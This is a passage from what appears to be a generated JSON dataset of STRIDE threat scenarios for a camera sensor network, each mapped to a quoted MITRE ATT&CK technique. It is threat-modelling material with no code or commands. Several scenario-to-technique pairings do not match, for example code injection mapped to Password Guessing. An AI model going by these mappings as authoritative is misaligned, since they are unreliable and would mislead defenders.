                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users might deny performing certain actions if detailed user activity is not logged.",
            "Assumptions": [
                {
                    "Assumption": "System does not implement comprehensive user activity logging.",
                    "Role": "System designer",
                    "Condition": "System design."
                },
                {
                    "Assumption": "Users have the capability to perform actions on the system.",
                    "Role": "Authorized user",
                    "Condition": "System access."
                }
            ],
            "Potential Impact": "Inability to assert user activity, complicating accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "activity logging",
                "user actions",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could manipulate log files to erase traces of their activities.",
            "Assumptions": [
                {
                    "Assumption": "Log files are not protected against tampering.",
                    "Role": "System administrator",
                    "Condition": "File protection."
                },
                {
                    "Assumption": "The attacker has access to the system\u2019s log storage.",
                    "Role": "Attacker",
                    "Condition": "Storage access control."
                }
            ],
            "Potential Impact": "Concealment of malicious activities, compromised data integrity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "file access",
                "storage"
            ],
            "mitre_technique": {
                "name": "Direct Volume Access",
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
                "id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
                "technique_id": "T1006"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could exploit a vulnerability to access visual data transmitted over the network.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not encrypted.",
                    "Role": "Network administrator",
                    "Condition": "Encryption policies."
                },
                {
                    "Assumption": "The attacker can intercept the network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network access."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive visual data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network traffic",
                "encryption",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive information stored on the camera nodes could be accessed if not properly encrypted.",
            "Assumptions": [
                {
                    "Assumption": "Local storage on devices is not encrypted.",
                    "Role": "Device manufacturer",
                    "Condition": "Data storage practices."
                },
                {
                    "Assumption": "The attacker has physical or logical access to the device.",
                    "Role": "Attacker",
                    "Condition": "Access control."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of stored sensitive data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "local storage",
                "encryption",
                "device access"
            ],
            "mitre_technique": {
                "name": "Private Keys",
                "description": "Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. (Citation: Wikipedia Public Key Crypto)\n\nAdversaries may gather private keys from compromised systems for use in authenticating to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:\\Users\\(username)\\.ssh\\</code> on Windows.\n\nPrivate keys should require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line.\n\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates. (Citation: Kaspersky Careto) (Citation: Palo Alto Prince of Persia)",
                "id": "attack-pattern--56ff457d-5e39-492b-974c-dfd2b8603ffe",
                "technique_id": "T1145"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could eavesdrop on the communication between the camera nodes and the central server.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not securely encrypted.",
                    "Role": "Network administrator",
                    "Condition": "Encryption policies."
                },
                {
                    "Assumption": "The attacker can intercept communication.",
                    "Role": "Attacker",
                    "Condition": "Network access."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive communication data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "eavesdropping",
                "network communication",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could initiate a Distributed Denial of Service (DDoS) attack to overload the network.",
            "Assumptions": [
                {
                    "Assumption": "Network infrastructure lacks adequate DDoS protection mechanisms.",
                    "Role": "Network administrator",
                    "Condition": "Network security."
                },
                {
                    "Assumption": "The attacker can generate sufficient traffic to overwhelm the network.",
                    "Role": "Attacker",
                    "Condition": "Resource availability."
                }
            ],
            "Potential Impact": "Disruption of network services and application unavailability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "network",
                "overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could exploit a vulnerability in the camera firmware to crash the devices.",
            "Assumptions": [
                {
                    "Assumption": "Firmware contains exploitable vulnerabilities.",
                    "Role": "Device manufacturer",
                    "Condition": "Firmware development practices."
                },
                {
                    "Assumption": "The attacker can identify and exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Exploit knowledge."
                }
            ],
            "Potential Impact": "Disruption of device functionality and visual data collection.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "exploitation",
                "firmware",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could flood the server with bogus data to exhaust its resources.",
            "Assumptions": [
                {
                    "Assumption": "The server lacks mechanisms to detect and mitigate bogus data.",
                    "Role": "System administrator",
                    "Condition": "Server configuration."
                },
                {
                    "Assumption": "The attacker has the means to send massive amounts of bogus data.",
                    "Role": "Attacker",
                    "Condition": "Resource availability."
                }
            ],
            "Potential Impact": "Resource exhaustion leading to system unavailability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "server",
                "bogus data",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit a vulnerability to escalate privileges from a camera node to the central server.",
            "Assumptions": [
                {
                    "Assumption": "There are unpatched vulnerabilities that allow privilege escalation.",
                    "Role": "System developer",
                    "Condition": "Software development practices."
                },
                {
                    "Assumption": "The attacker has access to exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Access control."
                }
            ],
            "Potential Impact": "Unauthorized administrator-level access and full system compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability",
                "privilege escalation",
                "central server"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could use a code injection vulnerability to gain higher privileges on the device.",
            "Assumptions": [
                {
                    "Assumption": "Code injection vulnerabilities exist in the system.",
                    "Role": "System developer",
                    "Condition": "Software development practices."
                },
                {
                    "Assumption": "The attacker can exploit this vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Exploit knowledge."
                }
            ],
            "Potential Impact": "Obtaining higher privileges and potentially taking control of the device.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "code injection",
                "device",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit overly permissive access control settings to gain undue privileges.",
            "Assumptions": [
                {
                    "Assumption": "Access control settings are not restrictive enough.",
                    "Role": "System administrator",
                    "Condition": "Access control policies."
                },
                {
                    "Assumption": "The attacker has user-level access to the network.",
                    "Role": "Attacker",
                    "Condition": "Network access."
                }
            ],
            "Potential Impact": "Escalation to higher privileges and potential system control.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "access control",
                "policy",
                "permissions"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "6",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access to camera feeds by spoofing the authorized camera node's credentials.",
            "Assumptions": [
                {
                    "Assumption": "Camera nodes have unique, but potentially exploitable credentials",
                    "Role": "Attacker",
                    "Condition": "Attacker has some access to credentials or can guess them"
                },
                {
                    "Assumption": "Network traffic is not encrypted",
                    "Role": "Attacker",
                    "Condition": "Attacker can intercept and modify traffic"
                },
                {
                    "Assumption": "The system lacks strong authentication mechanisms",
                    "Role": "System Architect",
                    "Condition": "System doesn't verify nodes strictly"
                }
            ],
            "Potential Impact": "Disruption of visual data integrity and unauthorized data access.",
            "MITRE ATT&CK Keywords": [
                "credential theft",
                "spoofing",
                "unauthorized access",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary sends malicious commands to the VSN network by impersonating a legitimate management console.",
            "Assumptions": [
                {
                    "Assumption": "Management console interfaces are vulnerable or exposed on the internet",
                    "Role": "Attacker",
                    "Condition": "Attacker identifies and exploits these interfaces"
                },
                {
                    "Assumption": "There is insufficient verification of command sources",
                    "Role": "System Architect",
                    "Condition": "System processes commands based solely on assumed legitimate identifiers"
                },
                {
                    "Assumption": "Adequate network security controls are insufficient",
                    "Role": "Network Administrator",
                    "Condition": "Network lacks segmentation or firewalls in critical paths"
                }
            ],
            "Potential Impact": "Loss of control over the camera network and potential data manipulation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "command injection",
                "network",
                "device impersonation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker masquerades as a trusted entity to intercept data streams between sensor nodes and the central server.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can position themselves within the communication path",
                    "Role": "Attacker",
                    "Condition": "Attacker has physical or logical network access"
                },
                {
                    "Assumption": "Network traffic is not sufficiently encrypted",
                    "Role": "System Architect",
                    "Condition": "Data in transit lacks strong encryption"
                },
                {
                    "Assumption": "Insufficient Mutual Authentication",
                    "Role": "System Architect",
                    "Condition": "Sensor nodes and server lack robust mutual authentication"
                }
            ],
            "Potential Impact": "Exposure of sensitive visual data and potential data leakage.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "network eavesdropping",
                "unauthorized access",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Unauthorized alteration of visual data stored on local camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Local storage on camera nodes is not secured",
                    "Role": "Attacker",
                    "Condition": "Attacker gains physical access to the nodes"
                },
                {
                    "Assumption": "Weak access control mechanisms",
                    "Role": "System Architect",
                    "Condition": "Nodes use default or weak passwords for local storage"
                },
                {
                    "Assumption": "Lack of encryption on local storage",
                    "Role": "System Architect",
                    "Condition": "Stored data is not encrypted"
                }
            ],
            "Potential Impact": "Corruption of stored visual data and loss of data integrity.",
